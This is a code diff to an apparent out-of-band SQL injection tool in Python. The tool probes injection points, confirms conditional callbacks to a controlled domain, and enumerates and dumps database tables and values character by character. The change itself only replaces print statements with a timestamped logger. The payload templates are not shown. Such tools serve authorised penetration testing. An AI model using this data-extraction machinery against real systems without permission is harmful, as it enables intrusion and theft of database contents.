@@ -1,6 +1,7 @@
 import argparse
 import copy
 import csv
+import datetime
 import io
 import json
 import string
@@ -19,6 +20,15 @@ from .tamper import TAMPERS, apply_tampers
 
 
 DEFAULT_ALPHABET = string.ascii_lowercase + string.digits
+
+
+def _ts() -> str:
+    return datetime.datetime.now().strftime("%H:%M:%S")
+
+
+def _log(level: str, msg: str, *, err: bool = False) -> None:
+    line = f"[{_ts()}] [{level}] {msg}"
+    print(line, file=sys.stderr if err else sys.stdout, flush=True)
 
 
 def _hi(text: str) -> str:
@@ -94,10 +104,10 @@ def send_payload(args, request, payload):
             verify_ssl=not getattr(args, "no_verify_ssl", False),
         )
         if args.verbose:
-            print(f"[http] {status} {len(body)} bytes")
+            _log("DEBUG", f"http {status}  {len(body)} bytes")
     except Exception as exc:
         if args.verbose:
-            print(f"[http] ignored error: {exc}")
+            _log("DEBUG", f"http error (ignored): {exc}")
 
 
 def extract_char_binary(args, profile, request, domain, log, run_id, expression, pos, alphabet):
@@ -137,21 +147,21 @@ def run_check(args, profile, request, domain, log, run_id) -> int:
     true_payload = profile.payload(args.base, args.true_condition, f"{true_token}.{domain}")
     false_payload = profile.payload(args.base, args.false_condition, f"{false_token}.{domain}")
 
-    print("[+] sending true probe …")
+    _log("INFO", "sending true probe …")
     send_payload(args, request, true_payload)
     true_hit = log.wait_any({true_token: "true"}, args.timeout)
 
-    print("[+] sending false probe …")
+    _log("INFO", "sending false probe …")
     send_payload(args, request, false_payload)
     false_hit = log.wait_any({false_token: "false"}, args.timeout)
 
     if true_hit and not false_hit:
-        print(_hi("[+] OOB condition confirmed ✓"))
+        _log("INFO", _hi("OOB condition confirmed ✓"))
         return 0
     if true_hit and false_hit:
-        print("[!] both true and false probes triggered — OOB capable but not conditional")
+        _log("WARNING", "both probes triggered — OOB capable but not conditional")
         return 2
-    print("[!] no reliable conditional OOB behavior detected")
+    _log("WARNING", "no reliable conditional OOB behavior detected")
     return 1
 
 
@@ -162,7 +172,7 @@ def check(args) -> int:
             rc = run_check(args, profile, request, domain, log, run_id)
             status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
             session.save_check(session.check_id(args.dbms, args.place, args.param), args.dbms, args.place, args.param, status)
-            print(f"[+] session: {session.path}")
+            _log("INFO", f"session: {session.path}")
             return rc
         finally:
             session.close()
@@ -178,11 +188,11 @@ def check(args) -> int:
     session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
     points = injection_points(request, args.level)
     if not points:
-        print("[!] no injection points found at this level")
+        _log("WARNING", "no injection points found at this level")
         session.close()
         return 1
 
-    print(f"[+] scanning {len(points)} injection point(s) with level={args.level}, risk={args.risk}")
+    _log("INFO", f"scanning {len(points)} injection point(s)  level={args.level}")
     found = False
     for point in points:
         candidate_args = copy.copy(args)
@@ -195,12 +205,12 @@ def check(args) -> int:
         status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
         session.save_check(session.check_id(args.dbms, point.place, point.name), args.dbms, point.place, point.name, status)
         if rc == 0:
-            print(_hi(f"[+] injectable OOB point: --place {point.place} -p {point.name}"))
+            _log("INFO", _hi(f"injectable OOB point: --place {point.place} -p {point.name}"))
             found = True
             if args.first:
                 break
 
-    print(f"[+] session: {session.path}")
+    _log("INFO", f"session: {session.path}")
     session.close()
     return 0 if found else 1
 
@@ -242,9 +252,10 @@ def _extract_value_parallel(args, profile, request, domain, log, run_id, session
             extraction_id, args.dbms, args.place, args.param,
             expression, alphabet, result, False,
         )
-        print(f"[>] pos {pos:02d}: {char}  {result}", flush=True)
+        _log("INFO", f"pos {pos:02d}: {char}  {result}")
 
-    print(f"\n[+] done  {_hi(result)}")
+    print()
+    _log("INFO", f"done  {_hi(result)}")
     session.save_extraction(
         extraction_id, args.dbms, args.place, args.param,
         expression, alphabet, result, True,
@@ -260,14 +271,14 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
     start_pos = 1
 
     if cached and cached["completed"]:
-        print(f"[+] resumed from session  {_hi(cached['value'])}")
+        _log("INFO", f"resumed completed value from session: {_hi(cached['value'])}")
         session.close()
         return cached["value"]
 
     if cached and cached["value"]:
         result = cached["value"]
         start_pos = len(result) + 1
-        print(f"[+] resuming from session at position {start_pos}: {result}")
+        _log("INFO", f"resuming from session at pos {start_pos}: {result}")
 
     _sep()
     print(f"  profile   {profile.name}  |  run {run_id}")
@@ -302,16 +313,18 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
             char = token_map[token] if token else None
 
         if not char:
-            print(f"\n[+] done  {_hi(result)}")
+            print()
+            _log("INFO", f"done  {_hi(result)}")
             session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, True)
             session.close()
             return result
 
         result += char
         session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
-        print(f"[>] pos {pos:02d}: {char}  {result}", flush=True)
+        _log("INFO", f"pos {pos:02d}: {char}  {result}")
 
-    print(f"\n[!] reached max length  {_hi(result)}")
+    print()
+    _log("WARNING", f"reached max-len  {_hi(result)}")
     session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
     session.close()
     return result
@@ -331,19 +344,20 @@ def dump(args) -> int:
     columns = [column.strip() for column in args.column.split(",") if column.strip()] if args.column else []
     columns = validate_dump_target(args, dbms, columns)
 
-    print(f"[+] dumping table {args.table} columns: {', '.join(columns)}")
+    _log("INFO", f"dumping {args.table} — columns: {', '.join(columns)}")
     if args.database:
-        print(f"[+] database/schema: {args.database}")
+        _log("INFO", f"database/schema: {args.database}")
     if args.where:
-        print(f"[+] where: {args.where}")
+        _log("INFO", f"where: {args.where}")
 
     rows = []
     for index in range(args.limit):
         expr = dbms.dump_expression(args.table, columns, index, args.where, args.database)
-        print(f"\n[+] row index {index}: {expr}")
+        print()
+        _log("INFO", f"row {index}: {expr}")
         value = extract_value(args, expr, args.alphabet, args.max_len)
         if not value:
-            print(f"[+] no more rows at index {index}")
+            _log("INFO", f"no more rows at index {index}")
             break
         row = split_dump_row(value, len(columns))
         rows.append(row)
@@ -355,10 +369,11 @@ def dump(args) -> int:
 
         if args.output_file:
             Path(args.output_file).write_text(output, encoding="utf-8")
-            print(f"[+] saved to {args.output_file}", file=sys.stderr)
+            _log("INFO", f"saved to {args.output_file}", err=True)
         else:
             if args.output_format == "table":
-                print("\n[+] dump result")
+                print()
+                _log("INFO", "dump result")
             print(output)
     return 0
 
@@ -376,7 +391,7 @@ def split_dump_row(value: str, column_count: int) -> list[str]:
 
 def print_dump_row(columns: list[str], row: list[str]):
     pairs = [f"{column}={value}" for column, value in zip(columns, row)]
-    print("[+] " + ", ".join(pairs))
+    _log("INFO", ", ".join(pairs))
 
 
 def print_dump_table(columns: list[str], rows: list[list[str]]):
@@ -439,7 +454,7 @@ def enum(args) -> int:
             values = enumerate_rows(args, "database", lambda index: dbms.dbs_expression(index))
             save_catalog_values(args, "dbs", values)
             if values:
-                print(f"[+] databases: {', '.join(values)}")
+                _log("INFO", f"databases: {', '.join(values)}")
             continue
         if key == "tables":
             values = enumerate_rows(args, "table", lambda index: dbms.table_expression(index, args.database))
@@ -458,32 +473,34 @@ def enum(args) -> int:
 
         expr = dbms.metadata_expression(key)
         if expr is None:
-            print(f"[!] {key} is not implemented for {args.dbms}")
+            _log("WARNING", f"{key} is not implemented for {args.dbms}")
         else:
-            print(f"\n[+] enum {key}: {expr}")
+            print()
+            _log("INFO", f"enum {key}: {expr}")
             value = extract_value(args, expr, args.alphabet, args.max_len)
-            print(f"[+] {key}: {value}")
+            _log("INFO", f"{key}: {_hi(value)}")
     return 0
 
 
 def enumerate_rows(args, label: str, expression_builder) -> list[str]:
     values = []
-    print(f"\n[+] enum {label}s")
+    print()
+    _log("INFO", f"enum {label}s")
     limit = getattr(args, "_catalog_limit", args.limit)
     for index in range(limit):
         try:
             expr = expression_builder(index)
         except ValueError as exc:
-            print(f"[!] {exc}")
+            _log("WARNING", str(exc))
             return values
 
-        print(f"[+] {label} index {index}: {expr}")
+        _log("INFO", f"{label} index {index}: {expr}")
         value = extract_value(args, expr, args.alphabet, args.max_len)
         if not value:
-            print(f"[+] no more {label}s at index {index}")
+            _log("INFO", f"no more {label}s at index {index}")
             break
         values.append(value)
-        print(f"[+] {label}[{index}]: {value}")
+        _log("INFO", f"{label}[{index}]: {_hi(value)}")
     return values
 
 
@@ -509,7 +526,7 @@ def validate_dump_target(args, dbms, columns: list[str]) -> list[str]:
     if not columns:
         if not known_columns:
             raise SystemExit(f"no columns discovered for table: {args.table}")
-        print(f"[+] auto-selected columns from catalog: {', '.join(known_columns)}")
+        _log("INFO", f"auto-selected columns from catalog: {', '.join(known_columns)}")
         return known_columns
 
     known_upper = {column.upper() for column in known_columns}
@@ -532,7 +549,7 @@ def get_or_enumerate_catalog(args, kind: str, expression_builder, table: str | N
     finally:
         session.close()
     if cached is not None:
-        print(f"[+] using cached {kind}: {', '.join(cached) if cached else '(empty)'}")
+        _log("INFO", f"using cached {kind}: {', '.join(cached) if cached else '(empty)'}")
         return cached
 
     label = "table" if kind == "tables" else f"column({table})"
@@ -729,7 +746,8 @@ def main(argv=None):
     try:
         return args.func(args)
     except KeyboardInterrupt:
-        print("\n[!] interrupted", file=sys.stderr)
+        print()
+        _log("WARNING", "interrupted", err=True)
         return 130
 
 
